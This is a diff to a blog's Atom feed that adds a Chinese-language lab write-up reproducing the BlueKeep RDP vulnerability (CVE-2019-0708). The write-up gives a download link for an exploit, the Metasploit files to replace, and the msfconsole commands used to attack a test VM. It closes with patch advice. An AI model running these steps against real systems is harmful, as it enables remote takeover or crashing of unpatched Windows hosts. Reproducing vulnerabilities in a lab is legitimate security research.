@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-11-27T03:30:43.621Z</updated>
+  <updated>2019-11-27T03:39:39.236Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2019-0708复现</title>
+    <link href="http://yoursite.com/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://yoursite.com/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/</id>
+    <published>2019-11-27T03:38:10.000Z</published>
+    <updated>2019-11-27T03:39:39.236Z</updated>
+    
+    <content type="html"><![CDATA[<p>BlueKeep（CVE-2019-0708）是微软远程桌面协议（RDP）实现中发现的一个安全漏洞，它允许远程执行代码。</p><a id="more"></a><h3 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h3><p>目标机：Windows 2007 X64    192.168.30.129<br>攻击机：kali    192.168.30.128</p><p>windows配置<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/1.jpg" alt="1"></p><p>kali 配置 - MSF下替换文件<br>EXP下载地址：<a href="https://github.com/backlion/demo/blob/master/CVE-2019-0708_RDP%20_MSF.zip" target="_blank" rel="noopener">https://github.com/backlion/demo/blob/master/CVE-2019-0708_RDP%20_MSF.zip</a>  </p><p>cve_2019_0708_bluekeep_rce.rb 添加 /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb  </p><p>rdp.rb 替换 /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb<br>rdp_scanner.rb 替换 /usr/share//metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb  </p><p>cve_2019_0708_bluekeep.rb 替换 /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb  </p><p>root@kali:~# msfconsole<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/2.jpg" alt="2"></p><p>msf5 &gt; reload_all    #重新加载所有模块<br>msf5 &gt; search cve_2019_0708<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/3.jpg" alt="3"></p><p>msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce<br>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; info<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/4.jpg" alt="4"></p><p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;set RHOSTS 192.168.30.129<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/5.jpg" alt="5"></p><p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;set target 3<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/6.jpg" alt="6"></p><p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;show options<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/7.jpg" alt="7"></p><p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;run<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/8.jpg" alt="8"></p><p>执行whoami<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/9.jpg" alt="9"></p><p>这种情况是把虚拟机打蓝屏了，此时，关机重启，多试几次。哈哈哈哈哈！（鬼知道我打蓝屏了多少次）<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/10.jpg" alt="10"><br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/11.jpg" alt="11"></p><p>修复建议：<br>安装微软为2019-0708推出的专用补丁：<br><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;BlueKeep（CVE-2019-0708）是微软远程桌面协议（RDP）实现中发现的一个安全漏洞，它允许远程执行代码。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
+    
+  </entry>
   
   <entry>
     <title>Harbor任意管理员注册漏洞(CVE-2019-16097)复现</title>
